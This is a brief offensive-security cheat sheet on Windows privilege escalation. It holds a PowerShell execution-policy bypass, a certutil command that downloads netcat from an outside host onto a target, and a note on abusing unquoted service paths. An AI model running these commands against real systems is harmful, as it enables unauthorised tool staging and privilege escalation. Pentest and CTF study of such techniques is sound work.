# Windows privilege escalation

## Getting powershell to run script without entering powershell console mode

```sh
powershell.exe -noprofile -executionpolicy bypass -file .\script.ps1
```

## Transferring files

### Curtutil

If you don't have powershell access:

```sh
certutil.exe -urlcache -split -f "http://10.10.14.17/nc.exe" c:\temp\nc.exe
```

## Unquoted service paths

If the binPath is set to
```
C:\Program Files\Unquoted Path Service\Common Files\service.exe
```
Windows will search in this order:
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\service.exe
```